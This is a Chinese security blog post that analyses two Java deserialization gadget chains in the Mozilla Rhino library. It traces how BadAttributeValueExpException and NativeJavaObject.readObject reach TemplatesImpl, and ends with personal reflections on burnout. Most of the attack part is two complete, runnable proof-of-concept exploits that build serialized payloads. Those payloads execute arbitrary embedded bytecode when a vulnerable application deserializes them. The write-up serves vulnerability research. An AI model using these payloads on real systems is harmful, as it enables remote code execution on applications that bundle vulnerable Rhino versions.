---
title: "Rhino 反序列化"
onlyTitle: true
date: 2026-5-1 21:05:14
categories:
- java
- 框架漏洞
tags:
- rhino
img: https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8196.jpg
---



# Rhino 反序列化

Rhino库是用来在Java中执行Js代码的一个库

pom：

```
		<dependency>
            <groupId>rhino</groupId>
            <artifactId>js</artifactId>
            <version>1.7R2</version>
        </dependency>
```

影响版本（据说）：js-1.7R2.jar



## Rhino1链

```java
BadAttributeValueExpException.readObject()
    NativeError.toString()
        ScriptableObject.getProperty()
            ScriptableObject.getImpl()
                NativeJavaMethod.call()
                    NativeJavaObject.unwrap()
                        MemberBox.invoke()
                            TemplatesImpl.newTransformer()
```

### nativeJavaMethod.call

根据链子分析，MemberBox是可序列化的

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707093244245.png)

MemberBox.invoke是个private方法，找一下在哪调用了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250702222912923.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250702223727159.png)

跟进到NativeJavaMethod.call，该函数实现了从JavaScript调用Java方法的逻辑

先通过findFunction根据参数类型从多个重载方法中选出一个最合适的。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707093540768.png)

对于普通参数，使用Context.jsToJava将JS参数转换为Java类型

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707093613811.png)

对于可变参数则构造数组去逐个转换。具体逻辑这里略过

然后是设置作用对象，如果是静态方法则把调用对象设为null。然后挨着读下代码，先是从参数中获取调用对象thisObj，然后调用meth.getDeclaringClass去获取方法对应的对象。思考一下，thisObj应该是meth.getDecaringClass的实例类对吧。但是这里调用了Wrapper.unwrap()，说明call方法传入的thisObj应该是封装后的对象

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707094212082.png)

这里methods是MemberBox，所以会走到MemberBox.invoke

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707095033706.png)

手动调用一下call方法，NativeJavaObject就继承了Wrapper，直接用他封装，也只能用他封装：

```java
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Context context = Context.enter();
        ScriptableObject scope = context.initStandardObjects();

        Method newTransformerMethod = TemplatesImpl.class.getDeclaredMethod("newTransformer");
        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformerMethod, "newTransformer");

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        Field javaObject = NativeJavaObject.class.getDeclaredField("javaObject");
        javaObject.setAccessible(true);
        javaObject.set(nativeJavaObject, templatesClass);

        nativeJavaMethod.call(context,scope,nativeJavaObject,new Class[]{});
```

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250708202759774.png)

### Native.toString

继续向上查找，寻找调用了NativeJavaMethod.call的地方

ScriptableObject.getImpl调用了call，不过调用对象必须是Scriptable子类，参数为空

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707101038719.png)

如果是调用newTransformer的话，参数自然为空

如果要调用有参方法也不是不行，直接调用上面那个if，去直接触发MemberBox.invoke

getImpl是从slot中取值，再进行后面的call调用，而且可以看出必须是GetterSlot才能进行调用

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707151912195.png)

那怎么让getSlot返回GetterSlot呢？

在ScriptableObject.accessSlot中，如果accessType为SLOT_MODIFY_GETTER_SETTER则会新建一个GetterSlot并添加

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250708195112877.png)

我们可以提前调用accessSlot去添加GetterSlot，我们的重点是要添加Slot，而不是新建（新建的话反射就能新建了）

利用setGetterOrSetter->getSlot->accessSlot去添加Slot，这样getSlot就能返回GetterSlot了

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250708204020416.png)

然后是链子ScriptableObject.getProperty->get->getImpl

NativeError.getString->ScriptableObject.getProperty

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707113139511.png)

至此Native.toString衔接到Native.getString

### 构造Poyload

前面我们已经写了手动调用nativeJavaMethod.call的过程。现在我们尝试接上后半部分

这里手动调用setGetterOrSetter去添加GetterSlot

```java
Class<?> nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        Constructor constructor = nativeErrorClass.getDeclaredConstructor();
        constructor.setAccessible(true);
        Object nativeError = constructor.newInstance();
        
        Method setGetterOrSetterMethod = ScriptableObject.class.getDeclaredMethod("setGetterOrSetter",String.class, int.class, Callable.class, boolean.class);

        setGetterOrSetterMethod.invoke(nativeError,"name",0,nativeJavaMethod, false);
```

还有一些参数上的问题

由于NativeJavaMethod.call thisObj参数来自固定的NativeError，这个类必定不是Wrapper的子类，但是这是个循环解析，会从getProtoType中取出o继续解析

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250714104744875.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250714104841839.png)

所以我们手动调用setPrototype去设置getPrototype取到nativeJavaObject，这个类就是Wrapper子类，这样就能顺利的break循环了

```java
        Method setPrototypeMethod = ScriptableObject.class.getDeclaredMethod("setPrototype", Scriptable.class);
        setPrototypeMethod.invoke(nativeError,nativeJavaObject);
```

另外还有反序列化时调用ScriptableObject.getTopLevelScope为空的问题，手动设置一下scope即可

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250714105313648.png)

```java
        nativeJavaObject.setParentScope( scope);
```

不过，如何新建这个ScriptObject scope呢？这是个抽象类

ScriptRuntime.initStandardObjects会去实例化NativeObject并返回，NativeObject就是ScriptObject的子类

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707153201364.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707153414665.png)

Context.initStandardObjects如下，可以去调用scriptRuntime.initStandardObjects

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707142836820.png)

Context可以由静态函数enter实例化创建

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707143200653.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250707143120275.png)



POC：

```java
package org.exploit.third.Rhino;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.mozilla.javascript.*;

import javax.management.BadAttributeValueExpException;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;

//BadAttributeValueExpException.readObject()
//    NativeError.toString()
//        ScriptableObject.getProperty()
//            ScriptableObject.getImpl()
//                NativeJavaMethod.call()
//                    NativeJavaObject.unwrap()
//                        MemberBox.invoke()
//                            TemplatesImpl.newTransformer()
public class rhino1 {
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        Context context = Context.enter();
        ScriptableObject scope = context.initStandardObjects();

        Method newTransformerMethod = TemplatesImpl.class.getDeclaredMethod("newTransformer");
        NativeJavaMethod nativeJavaMethod = new NativeJavaMethod(newTransformerMethod, "newTransformer");

        NativeJavaObject nativeJavaObject = new NativeJavaObject();
        nativeJavaObject.setParentScope( scope);
        Field javaObject = NativeJavaObject.class.getDeclaredField("javaObject");
        javaObject.setAccessible(true);
        javaObject.set(nativeJavaObject, templatesClass);

//        nativeJavaMethod.call(context,scope,nativeJavaObject,new Class[]{});

        Class<?> nativeErrorClass = Class.forName("org.mozilla.javascript.NativeError");
        Constructor constructor = nativeErrorClass.getDeclaredConstructor();
        constructor.setAccessible(true);
        Object nativeError = constructor.newInstance();

        Method setGetterOrSetterMethod = ScriptableObject.class.getDeclaredMethod("setGetterOrSetter",String.class, int.class, Callable.class, boolean.class);

        setGetterOrSetterMethod.invoke(nativeError,"name",0,nativeJavaMethod, false);

        Method setPrototypeMethod = ScriptableObject.class.getDeclaredMethod("setPrototype", Scriptable.class);
        setPrototypeMethod.invoke(nativeError,nativeJavaObject);
//        nativeError.toString();

        BadAttributeValueExpException badAttributeValueExpException = new BadAttributeValueExpException(null);
        Field field = BadAttributeValueExpException.class.getDeclaredField("val");
        field.setAccessible(true);
        field.set(badAttributeValueExpException, nativeError);
        serialize(badAttributeValueExpException);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```



![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250714103416780.png)

这个链子真就是把链子copy出来，然后全程自己构造的，写了2000多字，删了一大半，刚开始我去调用putImpl，进而调用getImpl。但是putImpl放进去会提前触发（笑），中间赋值NativeJavaObject, NativeJavaMethod，ScriptableObject也一度把我搞晕。。



## Rhino2链

```
NativeJavaObject.readObject()
    JavaAdapter.readAdapterObject()
        JavaAdapter.getAdapterClass()
            JavaAdapter.getObjectFunctionNames()
                ScriptableObject.getPropertyIds()
                    NativeJavaArray.getIds()
                        Environment.getIds()
                            ScriptableObject.getIds()
                                ScriptableObject.getProperty()
                                    NativeJavaArray.get()
                                        JavaMembers.get()
                                            TemplatesImpl.getOutputProperties()
```

依赖：rhino-js > 1.6R6

遭不住了，不想自己构造了，调试一波su18佬的吧！

POC：

```java
package org.exploit.third.Rhino;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.mozilla.javascript.*;
import org.mozilla.javascript.tools.shell.Environment;

import javax.management.BadAttributeValueExpException;
import java.io.IOException;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Hashtable;
import java.util.Map;

public class rhino2 {
    public static void customWriteAdapterObject(Object javaObject, ObjectOutputStream out) throws IOException {
        out.writeObject("java.lang.Object");
        out.writeObject(new String[0]);
        out.writeObject(javaObject);
    }
    public static void main(String[] args) throws Exception {
        byte[] code1 = Files.readAllBytes(Paths.get("target/classes/TemplatesImpl_RuntimeEvil.class"));
        TemplatesImpl templatesClass = new TemplatesImpl();
        Field[] fields = templatesClass.getClass().getDeclaredFields();
        for (Field field : fields) {
            field.setAccessible(true);
            if (field.getName().equals("_bytecodes")) {
                field.set(templatesClass, new byte[][]{code1});
            } else if (field.getName().equals("_name")) {
                field.set(templatesClass, "godown");
            } else if (field.getName().equals("_tfactory")) {
                field.set(templatesClass, new TransformerFactoryImpl());
            }
        }
        // 初始化一个 Environment 对象作为 scope
        ScriptableObject scope = new Environment();
        // 创建 associatedValues
        Map<Object, Object> associatedValues = new Hashtable<>();
        // 创建一个 ClassCache 实例
        Constructor ClassCacheConstructor = ClassCache.class.getDeclaredConstructor();
        Object classCacheObject = ClassCacheConstructor.newInstance();
        associatedValues.put("ClassCache", classCacheObject);

        Field associateField = ScriptableObject.class.getDeclaredField("associatedValues");
        associateField.setAccessible(true);
        associateField.set(scope, associatedValues);

        Class<?> memberBoxClass = Class.forName("org.mozilla.javascript.MemberBox");
        Constructor<?> constructor = memberBoxClass.getDeclaredConstructor(Method.class);
        constructor.setAccessible(true);
        Object initContextMemberBox = constructor.newInstance(Context.class.getMethod("enter"));

        ScriptableObject initContextScriptableObject = new Environment();
        Method makeSlot = ScriptableObject.class.getDeclaredMethod("accessSlot", String.class, int.class, int.class);
        makeSlot.setAccessible(true);
        Object slot = makeSlot.invoke(initContextScriptableObject, "su18", 0, 4);

        Class<?> slotClass = Class.forName("org.mozilla.javascript.ScriptableObject$GetterSlot");
        Field getterField = slotClass.getDeclaredField("getter");
        getterField.setAccessible(true);
        getterField.set(slot, initContextMemberBox);


        // 实例化 NativeJavaObject 类
        NativeJavaObject initContextNativeJavaObject = new NativeJavaObject();

        Field parentField = NativeJavaObject.class.getDeclaredField("parent");
        parentField.setAccessible(true);
        parentField.set(initContextNativeJavaObject, scope);

        Field isAdapterField = NativeJavaObject.class.getDeclaredField("isAdapter");
        isAdapterField.setAccessible(true);
        isAdapterField.set(initContextNativeJavaObject, true);

        Field adapterObject = NativeJavaObject.class.getDeclaredField("adapter_writeAdapterObject");
        adapterObject.setAccessible(true);
        adapterObject.set(initContextNativeJavaObject, rhino2.class.getDeclaredMethod("customWriteAdapterObject",
                Object.class, ObjectOutputStream.class));

        Field javaObject = NativeJavaObject.class.getDeclaredField("javaObject");
        javaObject.setAccessible(true);
        javaObject.set(initContextNativeJavaObject, initContextScriptableObject);

        ScriptableObject scriptableObject = new Environment();
        scriptableObject.setParentScope(initContextNativeJavaObject);
        makeSlot.invoke(scriptableObject, "outputProperties", 0, 2);


        // 实例化 NativeJavaArray类
        Constructor constructor2 = NativeJavaArray.class.getDeclaredConstructor(Scriptable.class, Object.class);
        constructor2.setAccessible(true);
        NativeJavaArray nativeJavaArray;
        nativeJavaArray = (NativeJavaArray) constructor2.newInstance(scriptableObject, new Object[]{"godown"});
//        nativeJavaArray = (NativeJavaArray) SerializeUtil.createInstanceUnsafely(NativeJavaArray.class);

        Field parentField2 = NativeJavaObject.class.getDeclaredField("parent");
        parentField2.setAccessible(true);
        parentField2.set(nativeJavaArray, scope);

        Field javaObject2 = NativeJavaObject.class.getDeclaredField("javaObject");
        javaObject2.setAccessible(true);
        javaObject2.set(nativeJavaArray, templatesClass);

        nativeJavaArray.setPrototype(scriptableObject);

        Field prototypeField = NativeJavaObject.class.getDeclaredField("prototype");
        prototypeField.setAccessible(true);
        prototypeField.set(nativeJavaArray, scriptableObject);

        // 实例化最外层的 NativeJavaObject

        NativeJavaObject nativeJavaObject = new NativeJavaObject();

        Field parentField3 = NativeJavaObject.class.getDeclaredField("parent");
        parentField3.setAccessible(true);
        parentField3.set(nativeJavaObject, scope);

        Field isAdapterField3 = NativeJavaObject.class.getDeclaredField("isAdapter");
        isAdapterField3.setAccessible(true);
        isAdapterField3.set(nativeJavaObject, true);

        Field adapterObject3 = NativeJavaObject.class.getDeclaredField("adapter_writeAdapterObject");
        adapterObject3.setAccessible(true);
        adapterObject3.set(nativeJavaObject, rhino2.class.getDeclaredMethod("customWriteAdapterObject",
                Object.class, ObjectOutputStream.class));

        Field javaObject3 = NativeJavaObject.class.getDeclaredField("javaObject");
        javaObject3.setAccessible(true);
        javaObject3.set(nativeJavaObject, nativeJavaArray);

        serialize(nativeJavaObject);
        unserialize("ser.bin");
    }
    public static void serialize(Object obj) throws Exception
    {
        java.io.FileOutputStream fos = new java.io.FileOutputStream("ser.bin");
        java.io.ObjectOutputStream oos = new java.io.ObjectOutputStream(fos);
        oos.writeObject(obj);
        oos.close();
    }
    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException
    {
        java.io.FileInputStream fis = new java.io.FileInputStream(Filename);
        java.io.ObjectInputStream ois = new java.io.ObjectInputStream(fis);
        Object obj = ois.readObject();
        ois.close();
        return obj;
    }
}

```



### 漏洞调试

从source开始看

NativeJavaObject在isAdapter为true时，会调用adapter_readAdapterObject.invoke，adapter_readAdapterObject就是普通的Method对象。可惜这里args的参数被固定为了this和ObjectInputStream。

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250714174320726.png)

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250714175129146.png)

直接反射修改isAdapter就行了，即使是transient，writeObject也会存储他

![](https://typora-202017030217.oss-cn-beijing.aliyuncs.com/typoraimage-20250714174527500.png)

能够接收这个invoke参数的，JavaAdapter.readAdapterObject算一个



写不完了，直接发吧，失去力气了，以后也没空分析这么精彩的链子了

唉这篇文写了一年，谁知道我这个文写了一年呢？

去年打hw的时候调这条链子，后来hw每天12h，打完回家缓了20day，然后去海南打一个月代审，回来紧锣密鼓的写论文，中途ai大爆发+云镜沙砾要过期了疯狂发力，过完春节回来疯狂找实习。竟然一年没有亲手写完这个链子了，我一向认为我是不懒的，该学的时候学，该玩的时候玩。但是很多时候都是在无意义的忙，很多事情如今看来就是毫无意义，没有改变我对世界的任何看法，没有长进我的技术，没有使我的心情变得愉悦，仅仅是应付。比如写论文推敲字眼，增删改查，比如做垃圾ppt，开垃圾会，人生怎么会有这些毫无意义的事情？

如今我的大脑结构发生了变化，以前写链子会让我的大脑产生愉悦，弹出计算机会让它分泌内啡肽，现在我更像看一些其他技术，可能是面试的时候，或者其他需求场景，让我用到这项技能的频率太低了。竟然让我感到写链子原来是一种自娱自乐的小丑行为，在两年之前我觉得那些看链子手搓代码的人好屌。。。现在看到这种链子要手搓两三天，不如学一些其他更通用的手法，自愿舍弃这个技能，被ai和所谓更强的安全世界抚平了皮质层

学一样忘一样



















